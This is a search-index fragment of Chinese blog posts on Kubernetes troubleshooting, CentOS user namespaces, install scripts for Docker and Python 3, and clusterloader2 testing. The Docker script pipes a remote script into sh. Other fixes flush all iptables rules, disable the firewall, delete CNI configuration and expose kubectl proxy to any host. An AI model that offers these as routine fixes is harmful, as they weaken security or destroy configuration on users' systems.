","date":"2020-12-25","objectID":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/:9:0","tags":["K8S"],"title":"安装部署k8s","uri":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/"},{"categories":["K8S"],"content":"问题 ","date":"2020-12-25","objectID":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/:10:0","tags":["K8S"],"title":"安装部署k8s","uri":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/"},{"categories":["K8S"],"content":"coredns等报错：connect: no route to host 现象： dial tcp 10.233.0.1:443: connect: no route to host 执行下面命令解决 systemctl stop kubelet systemctl stop docker iptables --flush iptables -tnat --flush systemctl start docker systemctl start kubelet The route problem can be solved by flush iptables. 类似网络路由问题，都可以使用上面命令解决 ","date":"2020-12-25","objectID":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/:10:1","tags":["K8S"],"title":"安装部署k8s","uri":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/"},{"categories":["K8S"],"content":"coredns pod 没有起来 HTTP probe failed with statuscode: 503 2月 02 10:09:19 node131 kubelet[36705]: I0202 10:09:19.484131 36705 prober.go:117] Readiness probe for \"coredns-8677555d68-tjw4l_kube-system(863c8ab1-0f68-437e-a8fc-735cc65a5ba6):coredns\" failed (failure): HTTP probe failed with statuscode: 503 2月 02 10:09:24 node131 kubelet[36705]: I0202 10:09:24.626538 36705 setters.go:86] Using node IP: \"192.168.182.131\" 2月 02 10:09:29 node131 kubelet[36705]: I0202 10:09:29.484193 36705 prober.go:117] Readiness probe for \"coredns-8677555d68-tjw4l_kube-system(863c8ab1-0f68-437e-a8fc-735cc65a5ba6):coredns\" failed (failure): HTTP probe failed with statuscode: 503 2月 02 10:09:34 node131 kubelet[36705]: I0202 10:09:34.691889 36705 setters.go:86] Using node IP: \"192.168.182.131\" 2月 02 10:09:39 node131 kubelet[36705]: I0202 10:09:39.484596 36705 prober.go:117] Readiness probe for \"coredns-8677555d68-tjw4l_kube-system(863c8ab1-0f68-437e-a8fc-735cc65a5ba6):coredns\" failed (failure): HTTP probe failed with statuscode: 503 查看防火墙，并关闭防火墙 查看防火墙的状态的命令为： sudo systemctl status firewalld 打开防火墙的方式有两种，一种是打开后重启会恢复回原来的状态，命令为： sudo systemctl start firewalld 另一种是打开后重启不会恢复到原来的状态，命令为： sudo systemctl enable firewalld 这种方式输入命令后要重启系统才会生效。 关闭防火墙的方式也有两种，和打开相对应，命令分别为 sudo systemctl stop firewalld sudo systemctl disable firewalld ","date":"2020-12-25","objectID":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/:10:2","tags":["K8S"],"title":"安装部署k8s","uri":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/"},{"categories":["K8S"],"content":"dns-autoscaler 报错 dns-autoscaler Update failure: the server could not find the requested resource E1222 01:07:18.706470 1 autoscaler_server.go:120] Update failure: the server could not find the requested resource 由于dns-autoscaler安装部署使用了低版本，现象分析可能是由于接口不匹配导致 ","date":"2020-12-25","objectID":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/:10:3","tags":["K8S"],"title":"安装部署k8s","uri":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/"},{"categories":["K8S"],"content":"创建pod报错 networkPlugin cni failed to set up pod “myapp-pod_default” network: failed to Statfs “/proc/62177/ns/net”: no such file or directory networkPlugin cni failed to set up pod network: failed to Statfs: no such file or directory 有人建议操作如下： I executed following commands: sudo systemctl stop kubelet docker ps docker stop [all running containers id] rm -rf /etc/cni/net.d/* sudo kubeadm reset sudo iptables -F \u0026\u0026 sudo iptables -t nat -F \u0026\u0026 sudo iptables -t mangle -F \u0026\u0026 sudo iptables -X sudo systemctl restart docker.service https://github.com/kubernetes/kubernetes/issues/90429 https://github.com/kubernetes/kubernetes/issues/72044 https://github.com/vmware-tanzu/antrea/issues/831 仔细分析系统日志/var/log/messages，发现Memory cgroup out of memory导致 Dec 22 14:58:50 node131 kernel: Memory cgroup stats for /kubepods.slice/kubepods-pod7458ce47_f199_4abc_bced_747429207f75.slice/docker-efdd061c291cc737e425bfe6b7f25a69352d75a99415143955098311908588c8.scope: cache:0KB rss:2048KB rss_huge:0KB mapped_file:0KB swap:0KB inactive_anon:0KB active_anon:2008KB inactive_file:0KB active_file:0KB unevictable:0KB Dec 22 14:58:50 node131 kernel: [ pid ] uid tgid total_vm rss nr_ptes swapents oom_score_adj name Dec 22 14:58:50 node131 kernel: [17978] 0 17978 39699 2343 27 0 -998 runc:[2:INIT] Dec 22 14:58:50 node131 kernel: Memory cgroup out of memory: Kill process 17983 (runc:[2:INIT]) score 4628 or sacrifice child Dec 22 14:58:50 node131 kernel: Killed process 17978 (runc:[2:INIT]), UID 0, total-vm:158796kB, anon-rss:6420kB, file-rss:2952kB, shmem-rss:0kB Dec 22 14:58:50 node131 kubelet: W1222 14:58:50.043333 1923 helpers.go:198] readString: Failed to read \"/sys/fs/cgroup/memory/kubepods.slice/kubepods-pod7458ce47_f199_4abc_bced_747429207f75.slice/docker-efdd061c291cc737e425bfe6b7f25a69352d75a99415143955098311908588c8.scope/memory.limit_in_bytes\": read /sys/fs/cgroup/memory/kubepods.slice/kubepods-pod7458ce47_f199_4abc_bced_747429207f75.slice/docker-efdd061c291cc737e425bfe6b7f25a69352d75a99415143955098311908588c8.scope/memory.limit_in_bytes: no such device 修改pod 请求内存，一般是请求内存太小，导致实际使用内存超过限制，被系统杀掉该pod进程 ","date":"2020-12-25","objectID":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/:10:4","tags":["K8S"],"title":"安装部署k8s","uri":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/"},{"categories":["K8S"],"content":"出现目录无法删除：Device or resource busy [root@gpu53 lib]# rm -rf kubelet/ rm: cannot remove ‘kubelet/pods/837704db-2bae-11eb-913c-6c92bf8c5840/volumes/kubernetes.io~secret/kube-proxy-token-8mdk5’: Device or resource busy rm: cannot remove ‘kubelet/pods/bce1b611-2bc3-11eb-9c41-6c92bf8c5840/volumes/kubernetes.io~secret/calico-node-token-d9dv8’: Device or resource busy rm: cannot remove ‘kubelet/pods/402d0c26-43fd-11eb-bdb1-6c92bf8c5840/volumes/kubernetes.io~secret/default-token-vlvfj’: Device or resource busy lsof没有信息，则查看挂载信息，并取消挂载。 # mount tmpfs on /var/lib/kubelet/pods/bce1b611-2bc3-11eb-9c41-6c92bf8c5840/volumes/kubernetes.io~secret/calico-node-token-d9dv8 type tmpfs (rw,relatime) tmpfs on /var/lib/kubelet/pods/837704db-2bae-11eb-913c-6c92bf8c5840/volumes/kubernetes.io~secret/kube-proxy-token-8mdk5 type tmpfs (rw,relatime) [root@gpu53 lib]# mount |grep kubelet tmpfs on /var/lib/kubelet/pods/837704db-2bae-11eb-913c-6c92bf8c5840/volumes/kubernetes.io~secret/kube-proxy-token-8mdk5 type tmpfs (rw,relatime) tmpfs on /var/lib/kubelet/pods/402d0c26-43fd-11eb-bdb1-6c92bf8c5840/volumes/kubernetes.io~secret/default-token-vlvfj type tmpfs (rw,relatime) [root@gpu53 lib]# [root@gpu53 lib]# [root@gpu53 lib]# umount /var/lib/kubelet/pods/837704db-2bae-11eb-913c-6c92bf8c5840/volumes/kubernetes.io~secret/kube-proxy-token-8mdk5 [root@gpu53 lib]# [root@gpu53 lib]# [root@gpu53 lib]# umount /var/lib/kubelet/pods/402d0c26-43fd-11eb-bdb1-6c92bf8c5840/volumes/kubernetes.io~secret/default-token-vlvfj [root@gpu53 lib]# [root@gpu53 lib]# rm -rf kubelet/ ","date":"2020-12-25","objectID":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/:10:5","tags":["K8S"],"title":"安装部署k8s","uri":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/"},{"categories":["K8S"],"content":"calico node pod一直没有起来 Number of node(s) with BGP peering established = 0 网上解决方法如下： https://blog.csdn.net/qq_36783142/article/details/107912407 - name: IP_AUTODETECTION_METHOD value: \"interface=enp26s0f3\" 但此方式不能解决自己环境所遇问题。 自己分析应该是网络路由问题（原来环境残留的脏路由导致），做下清理处理 执行下面命令解决 systemctl stop kubelet systemctl stop docker iptables --flush iptables -tnat --flush systemctl start docker systemctl start kubelet ","date":"2020-12-25","objectID":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/:10:6","tags":["K8S"],"title":"安装部署k8s","uri":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/"},{"categories":["K8S"],"content":"启动测试pod，Failed to create pod sandbox getting the final child’s pid from pipe caused: read init-p: connection reset by peer: unknown 报错如下： Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal Scheduled 74s default-scheduler Successfully assigned default/myapp-pod to gpu53 Normal SandboxChanged 78s (x12 over 89s) kubelet Pod sandbox changed, it will be killed and re-created. Warning FailedCreatePodSandBox 77s (x13 over 90s) kubelet Failed to create pod sandbox: rpc error: code = Unknown desc = failed to start sandbox container for pod \"myapp-pod\": Error response from daemon: OCI runtime create failed: container_linux.go:370: starting container process caused: process_linux.go:338: getting the final child's pid from pipe caused: read init-p: connection reset by peer: unknown 检查内核参数 max_user_namespaces，并修改，该方式为临时生效。 [root@node2 ~]# cat /proc/sys/user/max_user_namespaces 0 [root@node2 ~]# [root@node2 ~]# [root@node2 ~]# echo 10000 \u003e /proc/sys/user/max_user_namespaces [root@node2 ~]# [root@node2 ~]# [root@node2 ~]# cat /proc/sys/user/max_user_namespaces 10000 [root@node2 ~]# 具体详细修改参数user namespaces方式， 参考配置 CentOS 7 系统启用 user namespaces ","date":"2020-12-25","objectID":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/:10:7","tags":["K8S"],"title":"安装部署k8s","uri":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/"},{"categories":["K8S"],"content":"kuelet1.20 配置–cgroups-per-qos=False 时会导致kubelet无法正常启动 kuelet1.20 默认开启cgroups-per-qos kubelet启动的pod 所在cgroup组一般都在cgroup的kubepods.slice 目录下， ","date":"2020-12-25","objectID":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/:10:8","tags":["K8S"],"title":"安装部署k8s","uri":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/"},{"categories":["K8S"],"content":"测试pod一直是ContainerCreating NAMESPACE NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES default myapp-pod 0/1 ContainerCreating 0 11m \u003cnone\u003e gpu53 \u003cnone\u003e \u003cnone\u003e k 系统日志打印信息如下： Dec 23 09:52:18 gpu53 kernel: Task in /kubepods.slice/kubepods-pod40b435fc_0bbb_4eeb_9bff_5ce1f473cb9e.slice/docker-1f0491dfbae47dcf8a6b8f5b6f94e50ef3da592420f2d25e34d87f30524f71f2.scope killed as a result of limit of /kubepods.slice/kubepods-pod40b435fc_0bbb_4eeb_9bff_5ce1f473cb9e.slice Dec 23 09:52:18 gpu53 kernel: memory: usage 2048kB, limit 2048kB, failcnt 861 Dec 23 09:52:18 gpu53 kernel: memory+swap: usage 2048kB, limit 9007199254740988kB, failcnt 0 Dec 23 09:52:18 gpu53 kernel: kmem: usage 0kB, limit 9007199254740988kB, failcnt 0 Dec 23 09:52:18 gpu53 kernel: Memory cgroup stats for /kubepods.slice/kubepods-pod40b435fc_0bbb_4eeb_9bff_5ce1f473cb9e.slice: cache:0KB rss:0KB rss_huge:0KB mapped_file:0KB swap:0KB inactive_anon:0KB active_anon:0KB inactive_file:0KB active_file:0KB unevictable:0KB Dec 23 09:52:18 gpu53 kernel: Memory cgroup stats for /kubepods.slice/kubepods-pod40b435fc_0bbb_4eeb_9bff_5ce1f473cb9e.slice/docker-1f0491dfbae47dcf8a6b8f5b6f94e50ef3da592420f2d25e34d87f30524f71f2.scope: cache:0KB rss:2048KB rss_huge:0KB mapped_file:0KB swap:0KB inactive_anon:0KB active_anon:2020KB inactive_file:0KB active_file:0KB unevictable:0KB Dec 23 09:52:18 gpu53 kernel: [ pid ] uid tgid total_vm rss nr_ptes swapents oom_score_adj name Dec 23 09:52:18 gpu53 kernel: [112691] 0 112691 5734 1041 13 0 -998 6 Dec 23 09:52:18 gpu53 kernel: Memory cgroup out of memory: Kill process 112691 (6) score 1998 or sacrifice child Dec 23 09:52:18 gpu53 kernel: Killed process 112691 (6) total-vm:22936kB, anon-rss:1944kB, file-rss:2220kB, shmem-rss:0kB Dec 23 09:52:18 gpu53 systemd: Stopped libcontainer container 1f0491dfbae47dcf8a6b8f5b6f94e50ef3da592420f2d25e34d87f30524f71f2. Dec 23 09:52:18 gpu53 systemd: Stopping libcontainer container 1f0491dfbae47dcf8a6b8f5b6f94e50ef3da592420f2d25e34d87f30524f71f2. Dec 23 09:52:18 gpu53 containerd: time=\"2020-12-23T09:52:18.227196277+08:00\" level=info msg=\"shim reaped\" id=1f0491dfbae47dcf8a6b8f5b6f94e50ef3da592420f2d25e34d87f30524f71f2 Dec 23 09:52:18 gpu53 dockerd: time=\"2020-12-23T09:52:18.237403201+08:00\" level=error msg=\"stream copy error: reading from a closed fifo\" Dec 23 09:52:18 gpu53 dockerd: time=\"2020-12-23T09:52:18.237413120+08:00\" level=error msg=\"stream copy error: reading from a closed fifo\" Dec 23 09:52:18 gpu53 dockerd: time=\"2020-12-23T09:52:18.271031114+08:00\" level=error msg=\"1f0491dfbae47dcf8a6b8f5b6f94e50ef3da592420f2d25e34d87f30524f71f2 cleanup: failed to delete container from containerd: no such container\" Dec 23 09:52:18 gpu53 dockerd: time=\"2020-12-23T09:52:18.271110530+08:00\" level=error msg=\"Handler for POST /v1.40/containers/1f0491dfbae47dcf8a6b8f5b6f94e50ef3da592420f2d25e34d87f30524f71f2/start returned error: OCI runtime create failed: container_linux.go:370: starting container process caused: process_linux.go:338: getting the final child's pid from pipe caused: read init-p: connection reset by peer: unknown\" Dec 23 09:52:18 gpu53 kubelet: E1223 09:52:18.271582 104914 remote_runtime.go:116] RunPodSandbox from runtime service failed: rpc error: code = Unknown desc = failed to start sandbox container for pod \"myapp-pod\": Error response from daemon: OCI runtime create failed: container_linux.go:370: starting container process caused: process_linux.go:338: getting the final child's pid from pipe caused: read init-p: connection reset by peer: unknown Dec 23 09:52:18 gpu53 kubelet: E1223 09:52:18.271680 104914 kuberuntime_sandbox.go:70] CreatePodSandbox for pod \"myapp-pod_default(40b435fc-0bbb-4eeb-9bff-5ce1f473cb9e)\" failed: rpc error: code = Unknown desc = failed to start sandbox container for pod \"myapp-pod\": Error response from daemon: OCI runtime create failed: container_linux.go:370: starting container process caused: process_linux.go:338: getting the final child's pid from pipe caused: ","date":"2020-12-25","objectID":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/:10:9","tags":["K8S"],"title":"安装部署k8s","uri":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/"},{"categories":["K8S"],"content":"附录 ","date":"2020-12-25","objectID":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/:11:0","tags":["K8S"],"title":"安装部署k8s","uri":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/"},{"categories":["K8S"],"content":"命令 给节点node2 打master标签 kubectl label node node2 node-role.kubernetes.io/master=true --overwrite 给节点gpu53 打node标签 kubectl label node gpu53 node-role.kubernetes.io/node=true --overwrite 强制删除某pod kubectl delete po myapp-pod --force --grace-period=0 docker 镜像批量打包 docker save $(docker images | grep -v REPOSITORY | awk 'BEGIN{OFS=\":\";ORS=\" \"}{print $1,$2}') -o k8s_packages.tar ","date":"2020-12-25","objectID":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/:11:1","tags":["K8S"],"title":"安装部署k8s","uri":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/"},{"categories":["K8S"],"content":"访问dashboard 使用kubectl proxy 使用kubectl proxy命令就可以使API server监听在本地的8001端口上 使用命令如下: kubectl proxy --address='0.0.0.0' --accept-hosts='^*$' 则在内网的任意节点浏览器中可以使用地址访问，当然该地址需要证书授权访问 curl http://192.168.182.131:8001/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/ ","date":"2020-12-25","objectID":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/:11:2","tags":["K8S"],"title":"安装部署k8s","uri":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/"},{"categories":["Linux"],"content":"CentOS 7 启用 user namespaces（用户命名空间）","date":"2020-12-23","objectID":"/posts/2020/12/centos-7-%E5%90%AF%E7%94%A8-user-namespaces%E7%94%A8%E6%88%B7%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4/","tags":["Linux","CentOS"],"title":"CentOS 7 启用 user namespaces（用户命名空间）","uri":"/posts/2020/12/centos-7-%E5%90%AF%E7%94%A8-user-namespaces%E7%94%A8%E6%88%B7%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4/"},{"categories":["Linux"],"content":"在 CentOS 内核 3.8 或更高版本中，添加了 user namespaces （户名命名空间）功能。但是，该功能默认情况下是禁用的，原因是 Red Hat 希望该功能在社区中孵化更长时间，以确保该功能的稳定性和安全性。目前越来越多的软件开始涉及该功能，例如 Docker 等。 ","date":"2020-12-23","objectID":"/posts/2020/12/centos-7-%E5%90%AF%E7%94%A8-user-namespaces%E7%94%A8%E6%88%B7%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4/:0:0","tags":["Linux","CentOS"],"title":"CentOS 7 启用 user namespaces（用户命名空间）","uri":"/posts/2020/12/centos-7-%E5%90%AF%E7%94%A8-user-namespaces%E7%94%A8%E6%88%B7%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4/"},{"categories":["Linux"],"content":"配置 CentOS 7 系统启用 user namespaces 注意：以下操作均在 root 用户下完成，或者你的超级用户。 查看系统内核版本： uname -r #3.10.0-1062.el7.x86_64 临时配置，重启会失效，可用作临时验证： # 查看系统 user namespaces 最大为 0 cat /proc/sys/user/max_user_namespaces #0 # 临时开启 user namespace ，向文件内写入一个整数。 echo 10000 \u003e /proc/sys/user/max_user_namespaces 永久配置，设置 CentOS 7 的 kernel 开启 user namespace ，默认情况下是禁用的。并且，写入/etc/sysctl.conf配置user.max_user_namespaces=10000，最后重启系统。 # kernel 设置 grubby --args=\"user_namespace.enable=1\" --update-kernel=\"$(grubby --default-kernel)\" # 写入配置文件 echo \"user.max_user_namespaces=10000\" \u003e\u003e /etc/sysctl.conf # 重启 reboot 如需关闭 user namespace ，使用如下命令： grubby --remove-args=\"user_namespace.enable=1\" --update-kernel=\"$(grubby --default-kernel)\" ","date":"2020-12-23","objectID":"/posts/2020/12/centos-7-%E5%90%AF%E7%94%A8-user-namespaces%E7%94%A8%E6%88%B7%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4/:1:0","tags":["Linux","CentOS"],"title":"CentOS 7 启用 user namespaces（用户命名空间）","uri":"/posts/2020/12/centos-7-%E5%90%AF%E7%94%A8-user-namespaces%E7%94%A8%E6%88%B7%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4/"},{"categories":["Linux"],"content":"参考资料 https://www.redhat.com/en/blog/whats-next-containers-user-namespaces https://github.com/procszoo/procszoo/wiki/How-to-enable-%22user%22-namespace-in-RHEL7-and-CentOS7%3F https://superuser.com/questions/1294215/is-it-safe-to-enable-user-namespaces-in-centos-7-4-and-how-to-do-it ","date":"2020-12-23","objectID":"/posts/2020/12/centos-7-%E5%90%AF%E7%94%A8-user-namespaces%E7%94%A8%E6%88%B7%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4/:2:0","tags":["Linux","CentOS"],"title":"CentOS 7 启用 user namespaces（用户命名空间）","uri":"/posts/2020/12/centos-7-%E5%90%AF%E7%94%A8-user-namespaces%E7%94%A8%E6%88%B7%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4/"},{"categories":["Docker"],"content":"脚本一键安装部署docker19.03","date":"2020-12-21","objectID":"/posts/2020/12/%E8%84%9A%E6%9C%AC%E9%83%A8%E7%BD%B2docker/","tags":["Docker"],"title":"脚本部署Docker","uri":"/posts/2020/12/%E8%84%9A%E6%9C%AC%E9%83%A8%E7%BD%B2docker/"},{"categories":["Docker"],"content":"脚本一键安装部署docker19.03 ","date":"2020-12-21","objectID":"/posts/2020/12/%E8%84%9A%E6%9C%AC%E9%83%A8%E7%BD%B2docker/:0:0","tags":["Docker"],"title":"脚本部署Docker","uri":"/posts/2020/12/%E8%84%9A%E6%9C%AC%E9%83%A8%E7%BD%B2docker/"},{"categories":["Docker"],"content":"安装脚本 使用阿里云镜像源 docker参数 native.cgroupdriver=systemd #!/bin/bash # 安装docker # VAR SET DOCKER_VERSION=\"19.03.8\" echo \"START to install docker $DOCKER_VERSION\" export REGISTRY_MIRROR=https://registry.cn-hangzhou.aliyuncs.com # a) 检查和卸载旧版本(如果之前有安装docker) echo \"check and uninstall old docker...\" yum remove -y docker \\ docker-client \\ docker-client-latest \\ docker-common \\ docker-latest \\ docker-latest-logrotate \\ docker-logrotate \\ docker-selinux \\ docker-engine-selinux \\ docker-engine # b) 配置yum repository echo \"config yum repository...\" yum install -y yum-utils \\ device-mapper-persistent-data \\ lvm2 yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo # c) 安装并启动docker echo \"install docker $DOCKER_VERSION\" yum install -y docker-ce-$DOCKER_VERSION docker-ce-cli-$DOCKER_VERSION containerd.io systemctl enable docker systemctl start docker # d) 修改docker Cgroup Driver为systemd echo \"config docker Cgroup Driver: systemd\" sed -i \"s#^ExecStart=/usr/bin/dockerd.*#ExecStart=/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock --exec-opt native.cgroupdriver=systemd#g\" /usr/lib/systemd/system/docker.service # e) 设置 docker 镜像，提高 docker 镜像下载速度和稳定性 echo \"set docker mirror...\" curl -sSL https://kuboard.cn/install-script/set_mirror.sh | sh -s ${REGISTRY_MIRROR} systemctl daemon-reload systemctl restart docker docker version ","date":"2020-12-21","objectID":"/posts/2020/12/%E8%84%9A%E6%9C%AC%E9%83%A8%E7%BD%B2docker/:1:0","tags":["Docker"],"title":"脚本部署Docker","uri":"/posts/2020/12/%E8%84%9A%E6%9C%AC%E9%83%A8%E7%BD%B2docker/"},{"categories":["Python"],"content":"安装部署Python3","date":"2020-12-19","objectID":"/posts/2020/12/%E8%84%9A%E6%9C%AC%E9%83%A8%E7%BD%B2python3/","tags":["Python"],"title":"脚本部署Python3","uri":"/posts/2020/12/%E8%84%9A%E6%9C%AC%E9%83%A8%E7%BD%B2python3/"},{"categories":["Python"],"content":"脚本一键安装部署Python3 ","date":"2020-12-19","objectID":"/posts/2020/12/%E8%84%9A%E6%9C%AC%E9%83%A8%E7%BD%B2python3/:0:0","tags":["Python"],"title":"脚本部署Python3","uri":"/posts/2020/12/%E8%84%9A%E6%9C%AC%E9%83%A8%E7%BD%B2python3/"},{"categories":["Python"],"content":"安装脚本 centos系统自带默认python2 py3命令需要跟py2进行区别 #! /bin/bash yum -y install zlib-devel bzip2-devel libffi-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gdbm-devel db4-devel libpcap-devel xz-devel wget gcc python-devel openssl sshpass wget https://www.python.org/ftp/python/3.7.1/Python-3.7.1.tgz mkdir -p /usr/local/python3 tar -xf Python-3.7.1.tgz yum install libffi-devel -y cd Python-3.7.1 pwd ./configure --prefix=/usr/local/python3 make make install ln -s /usr/local/python3/bin/python3 /usr/bin/python3 ln -s /usr/local/python3/bin/pip3 /usr/bin/pip3 echo 'PATH=$PATH:$HOME/bin:/usr/local/python3/bin' \u003e\u003e/etc/profile echo 'export PATH' \u003e\u003e/etc/profile source /etc/profile ","date":"2020-12-19","objectID":"/posts/2020/12/%E8%84%9A%E6%9C%AC%E9%83%A8%E7%BD%B2python3/:1:0","tags":["Python"],"title":"脚本部署Python3","uri":"/posts/2020/12/%E8%84%9A%E6%9C%AC%E9%83%A8%E7%BD%B2python3/"},{"categories":["K8S"],"content":"如何使用perf-test的clusterloader进行性能测试","date":"2020-12-15","objectID":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/","tags":["K8S"],"title":"K8S集群性能测试-clusterloader","uri":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/"},{"categories":["K8S"],"content":"如何使用perf-test的clusterloader进行性能测试 ","date":"2020-12-15","objectID":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/:0:0","tags":["K8S"],"title":"K8S集群性能测试-clusterloader","uri":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/"},{"categories":["K8S"],"content":"1 K8S的性能指标：SLIs/SLOs K8S的SLI (服务等级指标) 和 SLO (服务等级目标)： Kubernetes 社区提供的K8S系统性能测试指标定义。 社区参考文档：Kubernetes scalability and performance SLIs/SLOs 目前社区提供的官方正式的性能指标有3个，如下表： Status SLI SLO Official Latency of mutating API calls for single objects for every (resource, verb) pair, measured as 99th percentile over last 5 minutes In default Kubernetes installation, for every (resource, verb) pair, excluding virtual and aggregated resources and Custom Resource Definitions, 99th percentile per cluster-day1 \u003c= 1s Official Latency of non-streaming read-only API calls for every (resource, scope pair, measured as 99th percentile over last 5 minutes In default Kubernetes installation, for every (resource, scope) pair, excluding virtual and aggregated resources and Custom Resource Definitions, 99th percentile per cluster-day1 (a) \u003c= 1s if scope=resource (b) \u003c= 5s if scope=namespace (c) \u003c= 30s if scope=cluster Official Startup latency of schedulable stateless pods, excluding time to pull images and run init containers, measured from pod creation timestamp to when all its containers are reported as started and observed via watch, measured as 99th percentile over last 5 minutes In default Kubernetes installation, 99th percentile per cluster-day1 \u003c= 5s ","date":"2020-12-15","objectID":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/:1:0","tags":["K8S"],"title":"K8S集群性能测试-clusterloader","uri":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/"},{"categories":["K8S"],"content":"2 clusterloader准备 从github上拉取perf-test项目，其中包含clusterloader2。perf-tests位置为：$GOPATH/src/k8s.io/perf-tests 需要选择与测试k8s集群匹配的版本，这里选择了1.14版本 进入clusterloader2目录，进行编译 export GOPATH=/home/wangb/goprojects cd $GOPATH/src/k8s.io/perf-tests/clusterloader2 go build -o clusterloader './cmd/' clusterloader2的测试配置文件在testing目录下。可以参考修改配置 按修改后的测试配置文件，指定参数变量，执行clusterloader测试 ","date":"2020-12-15","objectID":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/:2:0","tags":["K8S"],"title":"K8S集群性能测试-clusterloader","uri":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/"},{"categories":["K8S"],"content":"3 clusterloader测试 ","date":"2020-12-15","objectID":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/:3:0","tags":["K8S"],"title":"K8S集群性能测试-clusterloader","uri":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/"},{"categories":["K8S"],"content":"1. 运行命令 说明：运行命令前，需要根据测试场景，修改测试配置文件中的变量参数，配置文件包括有config.yaml， rc.yaml，deployment.yaml 具体配置参数说明，见下文。 # 进入clusterloader可执行文件目录，配置文件也需转移到了此位置 cd /home/wangb/perf-test/clusterloader2 # ssh访问参数 export KUBE_SSH_KEY_PATH=/root/.ssh/id_rsa # master节点信息 MASTER_NAME=node1 TEST_MASTER_IP=192.168.182.101 TEST_MASTER_INTERNAL_IP=192.168.182.101 KUBE_CONFIG=${HOME}/.kube/config # 测试配置文件 TEST_CONFIG='/home/wangb/perf-test/clusterloader2/testing/density/config2.yaml' # 测试报告目录位置 REPORT_DIR='./reports' # 测试日志打印文件 LOG_FILE='test.log' ./clusterloader --kubeconfig=$KUBE_CONFIG \\ --mastername=$TEST_MASTER_IP \\ --masterip=$MASTER_IP \\ --master-internal-ip=TEST_MASTER_INTERNAL_IP \\ --testconfig=$TEST_CONFIG \\ --report-dir=$REPORT_DIR \\ --alsologtostderr 2\u003e\u00261 | tee $LOG_FILE 运行命令可以指定nodes数量，不过这里默认使用集群全部节点。 